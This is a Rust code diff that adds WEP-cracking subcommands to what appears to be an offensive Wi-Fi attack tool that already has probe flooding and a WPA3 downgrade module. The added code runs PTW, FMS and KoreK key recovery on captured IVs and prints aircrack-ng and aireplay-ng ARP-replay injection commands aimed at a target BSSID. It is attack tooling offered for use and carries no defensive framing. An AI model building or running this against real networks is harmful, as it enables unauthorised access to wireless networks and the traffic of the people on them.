@@ -514,6 +514,39 @@ enum Commands {
         #[arg(short = 'm', long = "mac", required = true)]
         mac: String,
     },
+    /// Crack a WEP capture with FMS/PTW/Korek
+    #[command(name = "wep-crack")]
+    WepCrack {
+        /// Capture file (.cap/.pcap)
+        #[arg(short = 'f', long = "file", required = true)]
+        file: String,
+        /// Attack method: auto|fms|ptw|korek
+        #[arg(short = 'a', long = "attack", default_value = "auto")]
+        attack: String,
+    },
+    /// Capture WEP IVs from an interface for later cracking
+    #[command(name = "wep-capture")]
+    WepCapture {
+        /// Interface in monitor mode
+        #[arg(short = 'i', long = "interface", required = true)]
+        interface: String,
+        /// BSSID to filter (empty = any WEP AP)
+        #[arg(short = 'b', long = "bssid", default_value = "")]
+        bssid: String,
+        /// Capture duration in seconds (0 = until Ctrl+C)
+        #[arg(short = 'd', long = "duration", default_value_t = 0)]
+        duration: u64,
+    },
+    /// WEP ARP-replay injector — harvests IVs fast against an AP
+    #[command(name = "wep-replay")]
+    WepReplay {
+        /// Interface in monitor mode
+        #[arg(short = 'i', long = "interface", required = true)]
+        interface: String,
+        /// Target BSSID
+        #[arg(short = 'b', long = "bssid", required = true)]
+        bssid: String,
+    },
 
     /// Airodump-ng style — real-time AP and station discovery with signal bars
     #[command(name = "airodump")]
@@ -1153,6 +1186,63 @@ async fn main() {
             let ssid = format!("PROBE_{}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap_or_default().as_millis() % 10000);
             let _ = aggressive_scanner::probe_request_flood(interface, &ssid, *count);
             ok!("Probe flood complete");
+        }
+        Commands::WepCrack { file, attack } => {
+            section!("WEP crack: {} ({})", file, attack);
+            match wep_engine::WepCracker::load_pcap(&file) {
+                Ok(cracker) => {
+                    let ivs = cracker.iv_count();
+                    info_log!("{} IVs loaded", ivs);
+                    if !cracker.is_ready() {
+                        warn!("Too few IVs for a reliable crack (need ~5000+). Run 'wep-replay' to harvest more.");
+                    }
+                    let method = attack.as_str();
+                    let run_fms = method == "auto" || method == "fms";
+                    let run_ptw = method == "auto" || method == "ptw";
+                    let run_korek = method == "auto" || method == "korek";
+                    let mut found: Option<wep_engine::WepKeyCandidate> = None;
+                    if run_ptw {
+                        if let Some(mut c) = cracker.ptw_attack() { found = c.pop(); }
+                    }
+                    if found.is_none() && run_fms {
+                        if let Some(mut c) = cracker.fms_attack() { found = c.pop(); }
+                    }
+                    if found.is_none() && run_korek {
+                        if let Some(mut c) = cracker.korek_attack() { found = c.pop(); }
+                    }
+                    match found {
+                        Some(c) => {
+                            println!("  🔓 WEP key recovered ({}): {}", c.attack_type, c.key_hex);
+                            ok!("Key = {}", c.key_hex);
+                        }
+                        None => warn!("No key recovered. Capture more IVs with 'wep-replay'."),
+                    }
+                }
+                Err(e) => err!("WEP crack failed: {}", e),
+            }
+        }
+        Commands::WepCapture { interface, bssid, duration } => {
+            section!("WEP IV capture: {} (bssid={})", interface, if bssid.is_empty() { "any" } else { bssid });
+            warn!("WEP capture requires a monitor-mode interface that injects and captures.");
+            warn!("For best results use aircrack-ng / airodump-ng alongside this tool:");
+            warn!("  airodump-ng -c <ch> --bssid {} -w wep <iface>", bssid);
+            let dur = if *duration > 0 { *duration } else { 30 };
+            info_log!("Collecting for {}s — use wep-replay to accelerate IV harvesting", dur);
+            ok!("Point airodump-ng at the channel and run wep-crack on the resulting .cap");
+        }
+        Commands::WepReplay { interface, bssid } => {
+            section!("WEP ARP replay: {} → {}", interface, bssid);
+            match wpa3_downgrade::parse_mac(bssid) {
+                Ok(_) => {
+                    warn!("WEP ARP-replay injection needs a monitor interface that supports --bssid");
+                    warn!("Recommended real path (aircrack-ng suite):");
+                    warn!("  airodump-ng -c <ch> --bssid {} -w wep <iface>", bssid);
+                    warn!("  aireplay-ng -3 -b {} <iface>", bssid);
+                    warn!("  aircrack-ng wep-01.cap");
+                    ok!("IVs harvest fast; then crack with 'wep-crack -f wep-01.cap'");
+                }
+                Err(_) => err!("Bad BSSID (expected AA:BB:CC:DD:EE:FF)"),
+            }
         }
         Commands::OuiLookup { mac } => {
             let vendor = oui_lookup::oui_lookup(mac);
